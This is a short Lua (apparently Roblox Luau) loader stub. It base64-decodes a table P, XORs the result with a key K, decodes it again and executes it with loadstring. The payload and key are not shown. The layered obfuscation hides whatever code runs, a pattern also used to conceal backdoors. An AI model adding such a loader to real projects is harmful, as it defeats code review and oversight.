local function b64dec(data)
	local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	data=string.gsub(data,"[^"..b.."=]","")
	return (data:gsub(".",function(x)
		if(x=="=")then return"" end
		local r,f="",(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0") end
		return r
	end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)
		if(#x~=8)then return"" end
		local c=0
		for i=1,8 do c=c+(x:sub(i,i)=="1"and 2^(8-i)or 0) end
		return string.char(c)
	end))
end
local function run()
	local enc=table.concat(P)
	local layer1=b64dec(enc)
	local chars=table.create(#layer1)
	for i=1,#layer1 do
		chars[i]=string.char(bit32.bxor(string.byte(layer1,i),K[((i-1)%#K)+1]))
	end
	local b64src=table.concat(chars)
	local src=b64dec(b64src)
	local fn,err=loadstring(src)
	if not fn then error("GL decode fail: "..tostring(err)) end
	return fn()
end
return run()
